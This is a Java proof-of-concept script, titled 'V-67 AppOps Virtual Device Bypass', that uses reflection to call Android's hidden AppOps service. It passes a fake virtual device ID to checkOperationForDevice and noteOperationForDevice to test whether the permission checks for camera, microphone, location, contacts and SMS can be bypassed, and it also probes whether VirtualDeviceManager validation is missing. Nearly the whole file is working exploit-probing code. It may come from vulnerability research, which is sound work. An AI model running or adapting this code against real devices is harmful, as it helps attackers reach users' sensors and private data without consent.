import android.net.Uri;
import android.os.IBinder;
import java.lang.reflect.Method;

public class QuickTest {
    public static void main(String[] args) throws Exception {
        System.out.println("[*] V-67 AppOps Virtual Device Bypass — Quick Test");
        System.out.println("[*] UID: " + android.os.Process.myUid());
        System.out.println();

        // Step 1: Get IAppOpsService Binder
        Class<?> smClass = Class.forName("android.os.ServiceManager");
        Method getService = smClass.getDeclaredMethod("getService", String.class);
        IBinder appOpsBinder = (IBinder) getService.invoke(null, "appops");
        if (appOpsBinder == null) {
            System.out.println("[-] Cannot get appops binder");
            return;
        }

        Class<?> stubClass = Class.forName("com.android.internal.app.IAppOpsService$Stub");
        Method asInterface = stubClass.getDeclaredMethod("asInterface", IBinder.class);
        Object appOpsService = asInterface.invoke(null, appOpsBinder);
        System.out.println("[+] Got IAppOpsService proxy");
        System.out.println();

        // List relevant methods
        System.out.println("=== Scanning for virtualDevice-related methods ===");
        for (Method m : appOpsService.getClass().getMethods()) {
            String name = m.getName();
            if (name.contains("ForDevice") || name.contains("Device") ||
                name.contains("checkOperation") || name.contains("noteOperation") ||
                name.contains("startOperation") || name.contains("checkPackage")) {
                System.out.println("  " + name + "(" + paramStr(m) + ")");
            }
        }
        System.out.println();

        // Step 2: Test checkOperationForDevice with a fake virtualDeviceId
        // DEVICE_ID_DEFAULT = 0
        // We try a non-zero ID to see if it bypasses restrictions

        int OP_CAMERA = 26;     // AppOpsManager.OP_CAMERA
        int OP_RECORD_AUDIO = 27; // AppOpsManager.OP_RECORD_AUDIO
        int OP_COARSE_LOCATION = 0; // AppOpsManager.OP_COARSE_LOCATION
        int OP_FINE_LOCATION = 1;
        int OP_READ_CONTACTS = 4;
        int OP_READ_SMS = 14;

        int myUid = android.os.Process.myUid();
        String myPkg = "com.android.shell";

        int DEVICE_ID_DEFAULT = 0;
        int FAKE_DEVICE_ID = 12345;  // arbitrary non-zero ID

        // Try checkOperation with default device vs fake device
        System.out.println("=== Test: checkOperation with default vs fake virtualDeviceId ===");
        System.out.println("(Looking for difference in restriction behavior)");
        System.out.println();

        int[][] ops = {
            {OP_CAMERA, 26},
            {OP_RECORD_AUDIO, 27},
            {OP_COARSE_LOCATION, 0},
            {OP_FINE_LOCATION, 1},
            {OP_READ_CONTACTS, 4},
            {OP_READ_SMS, 14},
        };
        String[] opNames = {"CAMERA", "RECORD_AUDIO", "COARSE_LOCATION", "FINE_LOCATION", "READ_CONTACTS", "READ_SMS"};

        // Try to find checkOperationForDevice method
        Method checkForDevice = null;
        Method checkOp = null;
        for (Method m : appOpsService.getClass().getMethods()) {
            if (m.getName().equals("checkOperationForDevice") && m.getParameterTypes().length >= 5) {
                checkForDevice = m;
            }
            if (m.getName().equals("checkOperation") && m.getParameterTypes().length >= 3) {
                checkOp = m;
            }
        }

        if (checkForDevice != null) {
            System.out.println("[+] Found checkOperationForDevice: " + checkForDevice);
            System.out.println();
            // checkOperationForDevice(int code, int uid, String packageName,
            //                         String attributionTag, int virtualDeviceId)
            for (int i = 0; i < opNames.length; i++) {
                try {
                    int defaultResult = (int) checkForDevice.invoke(appOpsService,
                        ops[i][1], myUid, myPkg, null, DEVICE_ID_DEFAULT);
                    int fakeResult = -999;
                    try {
                        fakeResult = (int) checkForDevice.invoke(appOpsService,
                            ops[i][1], myUid, myPkg, null, FAKE_DEVICE_ID);
                    } catch (Exception e2) {
                        String msg = e2.getCause() != null ? e2.getCause().getMessage() : e2.getMessage();
                        System.out.println("  " + opNames[i] + ": default=" + modeStr(defaultResult)
                            + " | fakeVD=ERROR(" + msg + ")");
                        continue;
                    }
                    String diff = (defaultResult != fakeResult) ? " *** DIFFERENT ***" : "";
                    System.out.println("  " + opNames[i] + ": default=" + modeStr(defaultResult)
                        + " | fakeVD=" + modeStr(fakeResult) + diff);
                } catch (Exception e) {
                    String msg = e.getCause() != null ? e.getCause().getMessage() : e.getMessage();
                    System.out.println("  " + opNames[i] + ": ERROR — " + msg);
                }
            }
        } else {
            System.out.println("[-] checkOperationForDevice not found in Binder interface");
            if (checkOp != null) {
                System.out.println("[*] Found checkOperation: " + checkOp);
            }
        }

        System.out.println();

        // Step 3: Try noteOperationForDevice
        Method noteForDevice = null;
        for (Method m : appOpsService.getClass().getMethods()) {
            if (m.getName().equals("noteOperationForDevice")) {
                noteForDevice = m;
                break;
            }
        }

        if (noteForDevice != null) {
            System.out.println("[+] Found noteOperationForDevice: " + noteForDevice);
            System.out.println();
            System.out.println("=== Test: noteOperation with fake virtualDeviceId ===");

            // noteOperationForDevice(int code, int uid, String packageName,
            //    String attributionTag, int virtualDeviceId,
            //    boolean shouldCollectAsyncNotedOp, String message, boolean shouldCollectMessage)
            for (int i = 0; i < opNames.length; i++) {
                try {
                    Object result = noteForDevice.invoke(appOpsService,
                        ops[i][1], myUid, myPkg, null, FAKE_DEVICE_ID,
                        false, "v67-poc-test", false);
                    // SyncNotedAppOp has getOpMode()
                    Method getOpMode = result.getClass().getMethod("getOpMode");
                    int mode = (int) getOpMode.invoke(result);
                    System.out.println("  noteOp(" + opNames[i] + ", VD=" + FAKE_DEVICE_ID
                        + ") => " + modeStr(mode));
                } catch (Exception e) {
                    String msg = e.getCause() != null ? e.getCause().getMessage() : e.getMessage();
                    if (msg != null && msg.length() > 120) msg = msg.substring(0, 120) + "...";
                    System.out.println("  noteOp(" + opNames[i] + ", VD=" + FAKE_DEVICE_ID
                        + ") => ERROR: " + msg);
                }
            }
        } else {
            System.out.println("[-] noteOperationForDevice not found");
        }

        System.out.println();

        // Step 4: Check VirtualDeviceManager for existing devices
        System.out.println("=== Checking VirtualDeviceManager state ===");
        try {
            IBinder vdmBinder = (IBinder) getService.invoke(null, "virtualdevice");
            if (vdmBinder != null) {
                System.out.println("[+] VirtualDeviceManager service exists");
                System.out.println("    (mVirtualDeviceManagerInternal != null)");
                System.out.println("    -> isValidVirtualDeviceId() WILL validate IDs");
                System.out.println("    -> Fake IDs should be rejected");
            } else {
                System.out.println("[!] VirtualDeviceManager service NOT found");
                System.out.println("    -> mVirtualDeviceManagerInternal == null");
                System.out.println("    -> ANY virtualDeviceId would be considered valid!");
            }
        } catch (Exception e) {
            System.out.println("[x] Error checking VDM: " + e.getMessage());
        }

        System.out.println();
        System.out.println("=== Test Complete ===");
    }

    static String modeStr(int mode) {
        switch (mode) {
            case 0: return "ALLOWED(0)";
            case 1: return "IGNORED(1)";
            case 2: return "ERRORED(2)";
            case 3: return "DEFAULT(3)";
            case 4: return "FOREGROUND(4)";
            default: return "UNKNOWN(" + mode + ")";
        }
    }

    static String paramStr(Method m) {
        StringBuilder sb = new StringBuilder();
        for (Class<?> p : m.getParameterTypes()) {
            if (sb.length() > 0) sb.append(", ");
            sb.append(p.getSimpleName());
        }
        return sb.toString();
    }
}
